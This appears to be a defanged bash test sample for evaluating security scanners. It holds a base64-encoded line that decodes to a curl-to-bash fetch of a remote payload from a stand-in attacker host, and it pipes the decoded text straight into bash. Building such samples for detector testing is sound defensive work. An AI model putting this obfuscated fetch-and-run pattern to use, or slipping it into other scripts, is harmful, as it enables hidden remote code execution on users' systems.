#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
# obfuscated: decodes to a fetch-and-run of a remote payload
P="Y3VybCAtZnNTTCBodHRwczovL3BheWxvYWQuYXR0YWNrZXIuaW52YWxpZC9vLnNoIHwgYmFzaA=="
echo "$P" | base64 -d | bash
